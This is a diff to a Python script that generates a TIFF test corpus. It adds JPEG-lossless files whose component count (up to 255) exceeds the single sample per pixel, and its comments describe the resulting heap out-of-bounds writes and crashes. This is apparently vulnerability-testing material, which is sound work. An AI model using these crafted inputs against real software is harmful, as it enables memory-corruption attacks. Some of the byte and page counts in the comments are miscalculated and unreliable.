@@ -594,12 +594,29 @@ def generate_corpus(outdir='corpus'):
         ('tiff_jpegl_3spp_1nf_8b_512',
          build_plain_tiff(512, 512, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
         # --- 8-bit mismatch: Nf > SPP (OOB write direction, buffer too small) ---
+        # SPP=1 allocates 64*64*1=4096 bytes. Decoder writes 64*64*Nf bytes.
+        # Nf=3   → 8192  bytes OOB (doesn't cross page, silent)
+        # Nf=4   → 12288 bytes OOB (3 pages OOB, may cross allocation boundary)
+        # Nf=16  → 61440 bytes OOB (15 pages, very likely to corrupt heap)
+        # Nf=32  → 126976 bytes OOB (31 pages, crosses multiple heap regions)
+        # Nf=128 → 524288 bytes OOB (128 pages, guaranteed heap corruption)
+        # Nf=255 → 1044480 bytes OOB (255 pages, certain page fault / SIGSEGV)
         ('tiff_jpegl_1spp_3nf_8b',
          build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
         ('tiff_jpegl_1spp_4nf_8b',
          build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=4)),
+        ('tiff_jpegl_1spp_16nf_8b',
+         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=16)),
+        ('tiff_jpegl_1spp_32nf_8b',
+         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=32)),
+        ('tiff_jpegl_1spp_128nf_8b',
+         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=128)),
+        ('tiff_jpegl_1spp_255nf_8b',
+         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=255)),
         ('tiff_jpegl_1spp_3nf_8b_256',
          build_plain_tiff(256, 256, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
+        ('tiff_jpegl_1spp_32nf_8b_256',
+         build_plain_tiff(256, 256, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=32)),
         # --- 16-bit retained for reference (decode succeeds but PNG export fails) ---
         ('CTRL_tiff_jpegl_3spp_3nf_16b',
          build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
